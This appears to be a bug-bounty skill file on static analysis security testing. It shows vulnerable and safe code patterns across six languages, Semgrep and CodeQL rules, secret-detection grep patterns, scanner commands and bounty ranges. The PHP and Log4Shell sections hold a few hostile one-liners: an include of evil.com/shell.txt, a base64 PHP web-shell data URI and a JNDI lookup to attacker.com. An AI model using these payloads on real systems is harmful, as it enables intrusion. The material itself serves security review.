---
name: sast
description: "Static analysis security testing covering source code review, language-specific vulnerability patterns, custom rule development, and secrets detection"
difficulty: intermediate
bounty_range: "$500 - $15,000+"
---
> **TYPOGRAPHY RULE: NEVER use em dashes (--) in any output. Use a hyphen (-) or rewrite the sentence. Em dashes render as â€" on HackerOne.**


# Static Analysis Security Testing (SAST)

## Source Code Review Methodology

### Taint Analysis

```
CONCEPT:
Track data flow from untrusted SOURCES through the application to
dangerous SINKS. If tainted data reaches a sink without proper
SANITIZATION, it's a vulnerability.

SOURCES (untrusted input):
- HTTP request parameters (query, body, headers, cookies)
- File uploads
- Database reads (if data originated from user)
- Environment variables (in some contexts)
- External API responses
- Message queues
- URL fragments / paths

SINKS (dangerous operations):
- SQL queries (SQL injection)
- Command execution (OS command injection)
- HTML output (XSS)
- File system operations (path traversal)
- HTTP redirects (open redirect)
- Deserialization (RCE)
- XML parsing (XXE)
- Template rendering (SSTI)
- LDAP queries (LDAP injection)
- Email headers (header injection)

FLOW:
Source → [Transform1] → [Transform2] → Sink
         Is there proper sanitization/validation in the chain?
         If NO → VULNERABILITY
```

### Data Flow Tracking

```
MANUAL APPROACH:
1. Identify entry points (controllers, routes, API handlers)
2. Trace each user input parameter forward through the code
3. Note every function call, assignment, and transformation
4. Check if input reaches a dangerous operation
5. Verify whether sanitization is applied correctly

AUTOMATED APPROACH:
- Semgrep (pattern matching, limited data flow)
- CodeQL (full data flow analysis, interprocedural)
- SonarQube (commercial, good coverage)
- Snyk Code (AI-assisted, real-time)

PRIORITY ORDER FOR REVIEW:
1. Authentication / authorization logic
2. Input handling → database queries
3. Input handling → command execution
4. File upload / download handlers
5. Deserialization endpoints
6. Admin / debug / diagnostic endpoints
7. Payment / financial logic
8. Cryptographic implementations
```

## Language-Specific Vulnerability Patterns

### Python

```python
# SQL INJECTION
# VULNERABLE:
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
cursor.execute("SELECT * FROM users WHERE id = " + user_id)
cursor.execute("SELECT * FROM users WHERE id = %s" % user_id)

# SAFE:
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
cursor.execute("SELECT * FROM users WHERE id = :id", {"id": user_id})

# COMMAND INJECTION
# VULNERABLE:
os.system("ping " + user_input)
subprocess.call("ping " + user_input, shell=True)
eval(user_input)
exec(user_input)
__import__(user_input)

# SAFE:
subprocess.call(["ping", "-c", "1", user_input])  # No shell=True

# DESERIALIZATION
# VULNERABLE:
pickle.loads(user_data)        # Arbitrary code execution
yaml.load(user_data)           # PyYAML < 5.1 allows RCE
marshal.loads(user_data)       # Arbitrary code execution

# SAFE:
yaml.safe_load(user_data)
json.loads(user_data)

# PATH TRAVERSAL
# VULNERABLE:
open(os.path.join("/uploads", filename))  # ../../../etc/passwd

# SAFE:
safe_path = os.path.realpath(os.path.join("/uploads", filename))
if not safe_path.startswith("/uploads"):
    raise ValueError("Path traversal attempt")

# SSTI (Jinja2)
# VULNERABLE:
render_template_string(user_input)
Template(user_input).render()

# SAFE:
render_template("template.html", data=user_input)

# SSRF
# VULNERABLE:
requests.get(user_provided_url)
urllib.request.urlopen(user_provided_url)

# CHECK FOR:
# - No URL validation
# - No domain allowlist
# - Can reach internal IPs (127.0.0.1, 169.254.169.254)

# FLASK/DJANGO SPECIFIC:
# Debug mode in production
app.run(debug=True)    # Flask - Werkzeug debugger = RCE
DEBUG = True           # Django - detailed error pages

# Django ORM injection (rare but possible)
User.objects.extra(where=[user_input])
User.objects.raw(user_input)

# Mass assignment
form = UserForm(request.POST)  # Check which fields are included
```

### JavaScript / Node.js

```javascript
// SQL INJECTION
// VULNERABLE:
db.query(`SELECT * FROM users WHERE id = ${req.params.id}`);
db.query("SELECT * FROM users WHERE id = " + req.params.id);

// SAFE:
db.query("SELECT * FROM users WHERE id = ?", [req.params.id]);
db.query("SELECT * FROM users WHERE id = $1", [req.params.id]);

// COMMAND INJECTION
// VULNERABLE:
exec("ping " + req.query.host);
execSync(`ls ${userInput}`);
child_process.spawn("sh", ["-c", userCommand]);

// SAFE:
execFile("ping", ["-c", "1", req.query.host]);

// PROTOTYPE POLLUTION
// VULNERABLE:
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            target[key] = merge(target[key] || {}, source[key]);
        } else {
            target[key] = source[key];
        }
    }
}
// Attack: {"__proto__": {"isAdmin": true}}
// OR: {"constructor": {"prototype": {"isAdmin": true}}}

// CHECK FOR:
_.merge(obj, userInput)      // lodash merge
$.extend(true, obj, userInput)  // jQuery deep extend
Object.assign({}, userInput)  // Shallow, but nested objects...

// XSS
// VULNERABLE:
element.innerHTML = userInput;
document.write(userInput);
res.send(`<h1>${userInput}</h1>`);
dangerouslySetInnerHTML={{__html: userInput}}  // React

// SAFE:
element.textContent = userInput;
// React auto-escapes by default (except dangerouslySetInnerHTML)

// DESERIALIZATION
// VULNERABLE:
node-serialize: unserialize(userInput)  // RCE via IIFE
js-yaml: yaml.load(userInput)           // Code execution

// SAFE:
JSON.parse(userInput)  // No code execution
js-yaml: yaml.safeLoad(userInput)

// PATH TRAVERSAL
// VULNERABLE:
res.sendFile(path.join(__dirname, 'uploads', req.params.filename));
// req.params.filename = "../../../etc/passwd"

// REGEX DoS (ReDoS)
// VULNERABLE patterns:
/^(a+)+$/         // Catastrophic backtracking
/^([a-zA-Z0-9])+@/  // Email validation gone wrong
/(a|aa)+$/        // Nested quantifiers

// EXPRESS SPECIFIC:
// Missing rate limiting
// Missing helmet() security headers
// Missing CSRF protection
// Trust proxy misconfiguration
// Body parser size limits not set
```

### Java

```java
// SQL INJECTION
// VULNERABLE:
Statement stmt = conn.createStatement();
stmt.executeQuery("SELECT * FROM users WHERE id = " + userId);

String query = "SELECT * FROM users WHERE name = '" + name + "'";
stmt.executeQuery(query);

// SAFE:
PreparedStatement pstmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
pstmt.setInt(1, userId);

// DESERIALIZATION (critical - leads to RCE)
// VULNERABLE:
ObjectInputStream ois = new ObjectInputStream(inputStream);
Object obj = ois.readObject();  // Arbitrary code execution!

// DETECTION: Look for:
// - ObjectInputStream.readObject()
// - XMLDecoder.readObject()
// - Serializable classes with readObject/readResolve
// - Libraries: Apache Commons Collections, Spring, etc.

// Gadget chains: ysoserial payloads
// CommonsCollections1-7, Spring1-2, Groovy1, etc.

// XXE
// VULNERABLE:
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
// Missing: dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
Document doc = dbf.newDocumentBuilder().parse(inputStream);

SAXParserFactory spf = SAXParserFactory.newInstance();
// Missing: spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// SAFE:
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

// SSRF
// VULNERABLE:
URL url = new URL(userInput);
HttpURLConnection conn = (HttpURLConnection) url.openConnection();

// EL INJECTION (Expression Language)
// VULNERABLE:
${userInput}  // In JSP
#{userInput}  // In JSF

// Spring-specific:
// SpEL injection in @Value annotations
// Mass assignment via @ModelAttribute
// Actuator endpoints exposed (env, heapdump, shutdown)
// /actuator/env → environment variables (secrets)
// /actuator/heapdump → JVM heap (credentials in memory)

// LDAP INJECTION
// VULNERABLE:
String filter = "(&(uid=" + username + ")(userPassword=" + password + "))";
```

### Go

```go
// SQL INJECTION
// VULNERABLE:
db.Query("SELECT * FROM users WHERE id = " + id)
db.Query(fmt.Sprintf("SELECT * FROM users WHERE id = %s", id))

// SAFE:
db.Query("SELECT * FROM users WHERE id = $1", id)
db.QueryRow("SELECT * FROM users WHERE id = ?", id)

// COMMAND INJECTION
// VULNERABLE:
exec.Command("sh", "-c", "echo " + userInput).Output()
exec.Command("bash", "-c", userInput).Output()

// SAFE:
exec.Command("echo", userInput).Output()  // No shell interpretation

// PATH TRAVERSAL
// VULNERABLE:
http.ServeFile(w, r, filepath.Join("./uploads", r.URL.Path))
// r.URL.Path = "../../etc/passwd"

// SAFE:
cleanPath := filepath.Clean(r.URL.Path)
if strings.Contains(cleanPath, "..") {
    http.Error(w, "Forbidden", 403)
    return
}

// SSRF
// VULNERABLE:
resp, err := http.Get(userURL)
// No validation of target URL/IP

// TEMPLATE INJECTION
// VULNERABLE:
tmpl := template.New("").Parse(userInput)  // text/template = no escaping
// html/template auto-escapes but can be bypassed in certain contexts

// RACE CONDITIONS
// Go's goroutines make races common:
// - Concurrent map read/write (panic)
// - TOCTOU on file operations
// - Race between auth check and action
// Use: go test -race ./...

// Go-SPECIFIC ISSUES:
// - defer in loops (resource leak)
// - Unchecked error returns (err ignored)
// - Integer overflow (no built-in protection)
// - Nil pointer dereference
```

### PHP

```php
// SQL INJECTION
// VULNERABLE:
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];
$query = "SELECT * FROM users WHERE id = '$_GET[id]'";
mysql_query($query);  // Also: deprecated function

// SAFE:
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);

// COMMAND INJECTION
// VULNERABLE:
system("ping " . $_GET['host']);
exec("nslookup " . $domain);
passthru("cat " . $filename);
shell_exec("whois " . $target);
`ls $dir`;  // Backtick operator
preg_replace('/pattern/e', $replacement, $subject);  // /e flag = eval

// SAFE:
system("ping " . escapeshellarg($_GET['host']));
exec("nslookup " . escapeshellcmd($domain));

// FILE INCLUSION
// VULNERABLE:
include($_GET['page']);          // LFI: ?page=../../../etc/passwd
include($_GET['page'] . ".php"); // Bypass: null byte %00 (PHP < 5.3)
require("pages/" . $_GET['lang'] . "/header.php");

// RFI (if allow_url_include=On):
include("http://evil.com/shell.txt");

// PHP WRAPPERS:
php://filter/convert.base64-encode/resource=config.php  // Read source
php://input  // POST body as include
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+  // Data URI
expect://id  // If expect wrapper installed

// DESERIALIZATION
// VULNERABLE:
unserialize($_GET['data']);  // Object injection → magic methods → RCE
// Exploit via: __destruct(), __wakeup(), __toString() gadget chains

// SAFE:
json_decode($_GET['data']);

// TYPE JUGGLING
// PHP loose comparison (==) quirks:
"0e123" == "0e456"  → true  (both = 0 in scientific notation)
0 == "any-string"   → true  (PHP < 8.0)
"" == null          → true
"1" == true         → true

// VULNERABLE:
if ($_POST['password'] == $stored_hash) { ... }
// If hash starts with 0e and is all digits → equals 0 → bypass

// SAFE: Use strict comparison (===)

// PHP-SPECIFIC:
// - register_globals (ancient but still found)
// - magic_quotes_gpc bypass
// - extract() from user input (variable overwrite)
// - parse_str() without second argument (variable injection)
// - assert() with user input (code execution in older PHP)
// - preg_replace with /e modifier (code execution)
```

### Ruby

```ruby
# SQL INJECTION
# VULNERABLE:
User.where("name = '#{params[:name]}'")
User.find_by_sql("SELECT * FROM users WHERE id = #{params[:id]}")
User.order(params[:sort])  # Order clause injection

# SAFE:
User.where(name: params[:name])
User.where("name = ?", params[:name])

# COMMAND INJECTION
# VULNERABLE:
system("ping #{params[:host]}")
`ls #{params[:dir]}`
exec("cat #{filename}")
IO.popen("echo #{input}")
open("|echo #{input}")  # Pipe operator in open()

# SAFE:
system("ping", params[:host])  # Array form, no shell

# DESERIALIZATION
# VULNERABLE:
Marshal.load(user_data)       # Arbitrary object creation
YAML.load(user_data)          # Code execution via Psych
# Psych engine can instantiate arbitrary Ruby objects

# SAFE:
YAML.safe_load(user_data)
JSON.parse(user_data)

# ERB INJECTION (SSTI)
# VULNERABLE:
ERB.new(user_input).result
# Payload: <%= system('id') %>

# RAILS-SPECIFIC:
# - Mass assignment: permit all params without strong params
# - render file: path traversal via render file: params[:file]
# - redirect_to user_input (open redirect)
# - send_file user_input (arbitrary file read)
# - CVE-rich history: check Rails version for known vulnerabilities
# - Secret key base exposure (cookie decryption, RCE via deserialization)

# REGEX DoS:
# Ruby's regex engine is susceptible to catastrophic backtracking
/^(a+)+$/.match(user_input)
```

## Semgrep Rule Writing

### Basic Rules

```yaml
# Rule to detect SQL injection in Python
rules:
  - id: python-sqli
    pattern: |
      cursor.execute(f"...{$VAR}...")
    message: "Possible SQL injection via f-string"
    severity: ERROR
    languages: [python]

  - id: python-sqli-concat
    pattern: |
      cursor.execute("..." + $VAR)
    message: "Possible SQL injection via string concatenation"
    severity: ERROR
    languages: [python]
```

### Pattern Operators

```yaml
rules:
  # Match any of several patterns
  - id: dangerous-deserialization
    pattern-either:
      - pattern: pickle.loads(...)
      - pattern: yaml.load(...)
      - pattern: marshal.loads(...)
    message: "Dangerous deserialization of untrusted data"
    severity: ERROR
    languages: [python]

  # Match pattern but exclude safe variants
  - id: yaml-load-unsafe
    patterns:
      - pattern: yaml.load(...)
      - pattern-not: yaml.load(..., Loader=yaml.SafeLoader)
      - pattern-not: yaml.safe_load(...)
    message: "yaml.load without SafeLoader"
    severity: WARNING
    languages: [python]

  # Taint tracking (data flow)
  - id: sqli-taint
    mode: taint
    pattern-sources:
      - pattern: flask.request.args.get(...)
      - pattern: flask.request.form.get(...)
    pattern-sinks:
      - pattern: cursor.execute($QUERY, ...)
        focus-metavariable: $QUERY
    message: "User input flows to SQL query"
    severity: ERROR
    languages: [python]
```

### Running Semgrep

```bash
# Run default rules
semgrep --config auto .

# Run specific rulesets
semgrep --config p/owasp-top-ten .
semgrep --config p/python .
semgrep --config p/javascript .
semgrep --config p/java .

# Run custom rules
semgrep --config my-rules.yaml ./src/

# Output formats
semgrep --config auto --json -o results.json .
semgrep --config auto --sarif -o results.sarif .

# Target specific files
semgrep --config auto --include="*.py" .
semgrep --config auto --exclude="test_*" .

# Useful rulesets:
# p/owasp-top-ten     - OWASP Top 10 vulnerabilities
# p/security-audit    - Comprehensive security audit
# p/secrets           - Hardcoded secrets
# p/python            - Python-specific issues
# p/javascript        - JavaScript-specific issues
# p/java              - Java-specific issues
# p/golang            - Go-specific issues
# p/php               - PHP-specific issues
# p/ruby              - Ruby-specific issues
```

## CodeQL Query Development

### Basic Query Structure

```ql
/**
 * @name SQL injection from request parameter
 * @description User input used in SQL query without sanitization
 * @kind path-problem
 * @problem.severity error
 * @security-severity 9.8
 * @tags security
 *       external/cwe/cwe-089
 */

import python
import semmle.python.dataflow.new.DataFlow
import semmle.python.dataflow.new.TaintTracking
import semmle.python.Concepts

class SqlInjectionConfig extends TaintTracking::Configuration {
  SqlInjectionConfig() { this = "SqlInjectionConfig" }

  override predicate isSource(DataFlow::Node source) {
    source instanceof RemoteFlowSource
  }

  override predicate isSink(DataFlow::Node sink) {
    exists(SqlExecution sql | sink = sql.getSql())
  }
}

from SqlInjectionConfig config, DataFlow::PathNode source, DataFlow::PathNode sink
where config.hasFlowPath(source, sink)
select sink.getNode(), source, sink, "SQL injection from $@.", source.getNode(), "user input"
```

### Running CodeQL

```bash
# Create database from source code
codeql database create mydb --language=python --source-root=./src
codeql database create mydb --language=javascript --source-root=./src
codeql database create mydb --language=java --source-root=./src

# Run queries
codeql database analyze mydb codeql/python-queries --format=sarif-latest --output=results.sarif

# Run specific query
codeql query run my-query.ql --database=mydb

# GitHub Code Scanning integration
# Add .github/codeql/codeql-config.yml
# CodeQL runs automatically on push/PR via GitHub Actions
```

## Secrets Detection

### Patterns to Search For

```bash
# API Keys and Tokens
grep -rn "AKIA[0-9A-Z]{16}" .                    # AWS Access Key ID
grep -rn "AIza[0-9A-Za-z\-_]{35}" .              # Google API Key
grep -rn "sk_live_[0-9a-zA-Z]{24}" .             # Stripe Secret Key
grep -rn "sk-[a-zA-Z0-9]{48}" .                  # OpenAI API Key
grep -rn "ghp_[a-zA-Z0-9]{36}" .                 # GitHub Personal Token
grep -rn "glpat-[a-zA-Z0-9\-]{20}" .             # GitLab Personal Token
grep -rn "xoxb-[0-9]{11}-[0-9]{11}-[a-zA-Z0-9]{24}" .  # Slack Bot Token
grep -rn "SG\.[a-zA-Z0-9]{22}\.[a-zA-Z0-9]{43}" .      # SendGrid API Key
grep -rn "sq0csp-[a-zA-Z0-9\-_]{43}" .           # Square OAuth Secret

# Passwords and Secrets
grep -rn "password\s*=\s*['\"]" .
grep -rn "passwd\s*=\s*['\"]" .
grep -rn "secret\s*=\s*['\"]" .
grep -rn "api_key\s*=\s*['\"]" .
grep -rn "token\s*=\s*['\"]" .
grep -rn "auth\s*=\s*['\"]" .

# Private Keys
grep -rn "BEGIN RSA PRIVATE KEY" .
grep -rn "BEGIN DSA PRIVATE KEY" .
grep -rn "BEGIN EC PRIVATE KEY" .
grep -rn "BEGIN OPENSSH PRIVATE KEY" .
grep -rn "BEGIN PGP PRIVATE KEY BLOCK" .

# Connection Strings
grep -rn "mongodb://.*:.*@" .
grep -rn "postgres://.*:.*@" .
grep -rn "mysql://.*:.*@" .
grep -rn "redis://.*:.*@" .
grep -rn "amqp://.*:.*@" .

# JWT tokens (may contain secrets in payload)
grep -rn "eyJ[a-zA-Z0-9_-]*\.eyJ[a-zA-Z0-9_-]*\." .
```

### Automated Secrets Scanning

```bash
# TruffleHog - comprehensive secrets scanner
trufflehog git file://./repo --json
trufflehog github --org=target-org --json
trufflehog s3 --bucket=target-bucket
# Scans git history for high-entropy strings and known patterns

# GitLeaks - git secrets scanner
gitleaks detect --source=. --report-format=json --report-path=results.json
gitleaks detect --source=. --verbose
# Custom config: .gitleaks.toml

# detect-secrets (Yelp)
detect-secrets scan . --all-files > .secrets.baseline
detect-secrets audit .secrets.baseline

# GitHub secret scanning
# Enabled by default on public repos
# Custom patterns via repository settings

# Semgrep secrets
semgrep --config p/secrets .
```

## Dependency Vulnerability Scanning

### JavaScript/Node.js

```bash
# npm audit
npm audit
npm audit --json > audit-results.json
npm audit fix  # Auto-fix compatible updates

# Snyk
snyk test
snyk test --json > snyk-results.json
snyk monitor  # Continuous monitoring

# Retire.js (client-side JS)
retire --path ./src --outputformat json

# Check for known vulnerable packages:
# - lodash < 4.17.21 (prototype pollution)
# - express < 4.17.3 (open redirect)
# - jsonwebtoken < 9.0.0 (algorithm confusion)
# - axios < 0.21.1 (SSRF)
# - node-fetch < 2.6.7 (header injection)
```

### Python

```bash
# pip-audit
pip-audit
pip-audit --format=json > audit-results.json

# Safety
safety check --json > safety-results.json
safety check -r requirements.txt

# Snyk
snyk test --file=requirements.txt

# Bandit (Python-specific security linter)
bandit -r ./src -f json -o bandit-results.json
bandit -r ./src -ll  # Only medium and high severity

# Key checks:
# - Django version (frequent security patches)
# - Flask-related CVEs
# - Pillow (image processing, frequent RCE patches)
# - PyYAML (deserialization)
# - cryptography library versions
# - requests library (SSRF, header injection)
```

### Java

```bash
# OWASP Dependency-Check
dependency-check --scan ./lib --format JSON --out ./report

# Maven
mvn org.owasp:dependency-check-maven:check

# Gradle
gradle dependencyCheckAnalyze

# Snyk
snyk test --file=pom.xml

# Key checks:
# - Log4j versions (Log4Shell CVE-2021-44228)
# - Spring Framework (Spring4Shell CVE-2022-22965)
# - Apache Commons Collections (deserialization)
# - Jackson Databind (deserialization chain)
# - Apache Struts (multiple critical RCEs)
```

### Go

```bash
# govulncheck (official Go vulnerability scanner)
govulncheck ./...

# Nancy (Sonatype)
go list -json -deps ./... | nancy sleuth

# Snyk
snyk test

# Key checks:
# - Standard library vulnerabilities
# - gRPC vulnerabilities
# - net/http DoS issues
```

### Ruby

```bash
# Bundler Audit
bundle-audit check
bundle-audit update  # Update vulnerability database

# Brakeman (Rails-specific)
brakeman -o report.json

# Snyk
snyk test --file=Gemfile.lock
```

## Testing Workflow

### Phase 1: Automated Scanning

```bash
# 1. Run SAST tools
semgrep --config auto --json -o semgrep.json .
bandit -r ./src -f json -o bandit.json          # Python
brakeman -o brakeman.json                        # Ruby/Rails

# 2. Run secrets scanner
trufflehog git file://. --json > secrets.json
gitleaks detect --source=. --report-format=json --report-path=gitleaks.json

# 3. Run dependency scanner
npm audit --json > npm-audit.json               # Node.js
pip-audit --format=json > pip-audit.json        # Python
dependency-check --scan . --format JSON          # Java

# 4. Run CodeQL (if available)
codeql database create db --language=python
codeql database analyze db codeql/python-queries --format=sarif-latest
```

### Phase 2: Triage Results

```
PRIORITY:
1. CRITICAL: Known exploitable (deserialization, SQLi, RCE)
2. HIGH: Likely exploitable (XSS, path traversal, SSRF)
3. MEDIUM: Potentially exploitable (info disclosure, weak crypto)
4. LOW: Best practice violations (missing headers, verbose errors)
5. FALSE POSITIVES: Filter out test files, example code, dead code

FALSE POSITIVE INDICATORS:
- Finding is in test file (test_*, *_test.go, *Test.java)
- Finding is in example/sample code
- Finding is in commented-out code
- Finding has sanitization that tool didn't detect
- Finding is in unreachable code path
```

### Phase 3: Manual Verification

```
FOR EACH HIGH/CRITICAL FINDING:
1. Read the code context (surrounding 20+ lines)
2. Trace data flow manually (source → sink)
3. Check for sanitization the tool missed
4. Determine if input is actually user-controlled
5. Assess exploitability (can attacker reach this code path?)
6. Write proof of concept if exploitable
7. Document finding with code snippets and explanation
```

## Evidence Requirements

```
REQUIRED EVIDENCE:
1. Vulnerable file path and line numbers
2. Code snippet showing the vulnerability (with context)
3. Data flow trace: source → transforms → sink
4. Proof that input is user-controlled
5. Proof of concept (working exploit or test case)
6. Impact assessment
7. Suggested fix with corrected code

FORMAT:
Vulnerability: [Type]
File: [path/to/file.py:line_number]
Severity: [Critical/High/Medium/Low]

Vulnerable Code:
```[language]
[code snippet with vulnerability highlighted]
```

Data Flow:
1. User input enters at [source]
2. Passes through [function1] → [function2]
3. Reaches [dangerous sink] without sanitization

Proof of Concept:
[curl command, test script, or reproduction steps]

Impact:
[What an attacker can achieve]

Fix:
```[language]
[corrected code]
```
```

## Bounty Ranges

| Vulnerability | Typical Range | Notes |
|--------------|---------------|-------|
| RCE via deserialization | $5,000 - $15,000 | Critical, easy to exploit |
| SQL injection (source code) | $2,000 - $10,000 | Must prove exploitability |
| Hardcoded API keys (prod) | $500 - $5,000 | Depends on key scope |
| Hardcoded credentials | $1,000 - $5,000 | Higher if admin access |
| SSRF in source code | $2,000 - $10,000 | Higher with cloud metadata |
| Command injection | $3,000 - $15,000 | Must prove reachability |
| Prototype pollution | $1,000 - $5,000 | Higher with RCE chain |
| Path traversal | $1,000 - $5,000 | Higher if sensitive files |
| Secrets in git history | $500 - $3,000 | Depends on secret type |
| Vulnerable dependency (critical) | $500 - $3,000 | Must prove exploitability |
| XXE in source code | $1,000 - $5,000 | Higher with file read/SSRF |
| SSTI | $2,000 - $10,000 | Often leads to RCE |

### Notes on Source Code Findings

```
SOURCE CODE ACCESS:
- Open source projects: review directly on GitHub
- Bug bounty scope: some programs include source review
- Leaked source: check if in scope (usually NOT)
- Client-side code: JavaScript is always reviewable
- Mobile apps: decompiled code is fair game

IMPORTANT:
- Source code findings often require PROOF OF EXPLOITATION
- "There's a SQL injection in the code" is not enough
- You MUST demonstrate the vulnerability is reachable
- Provide a working curl command or POC script
- Show the vulnerable endpoint, not just the code
```

## Real-World Examples

```
Log4Shell (CVE-2021-44228):
- JNDI injection in Log4j logging library
- ${jndi:ldap://attacker.com/exploit} in any logged string
- Affected virtually every Java application
- Dependency scanning would have flagged Log4j 2.0-2.14.1
- Bounties: $5,000-$50,000+ across programs

Codecov Supply Chain (2021):
- Attacker modified Codecov bash uploader script
- Exfiltrated CI/CD environment variables (secrets)
- Secrets detection would have caught the modified script
- Affected thousands of CI/CD pipelines

Event-Stream NPM (2018):
- Malicious dependency added to popular npm package
- Targeted specific Bitcoin wallet application
- Dependency scanning and code review would have caught it
- 8M weekly downloads compromised

ua-parser-js NPM Hijack (2021):
- Account takeover of popular npm package maintainer
- Cryptominer and credential stealer injected
- 8M weekly downloads affected
- Dependency pinning and lockfile audit would have detected

GitHub Copilot Secrets (Ongoing):
- AI-generated code often includes hardcoded secrets from training data
- Secret scanning catches these before commit
- Estimated 2-5% of Copilot suggestions contain potential secrets
```
